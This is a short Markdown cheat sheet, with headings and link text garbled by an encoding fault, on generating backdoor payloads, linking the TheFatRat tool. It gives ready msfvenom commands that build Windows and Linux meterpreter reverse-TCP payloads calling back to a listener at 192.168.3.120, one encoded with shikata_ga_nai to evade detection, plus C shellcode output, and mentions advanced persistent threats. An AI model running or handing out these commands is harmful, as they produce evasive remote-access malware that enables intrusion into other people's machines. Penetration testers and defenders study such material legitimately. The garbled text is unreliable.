## ���ĺ������ɹ��� 

- https://github.com/Screetsec/TheFatRat

```bash
msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.120 LPORT=9001 -e x86/shikata_ga_nai -b '\x00\x0a\xff' -i 3 -f exe -o payload.exe
```

### linux ��
```bash
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.120 LPORT=9011 -f elf -o linux.elf
msfvenom -a x86 --platform Linux -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.3.120 LPORT=9021 -f c
```


apt ������ advanced-persistent-threat


- [����͸�̳�](https://xz.aliyun.com/t/2536)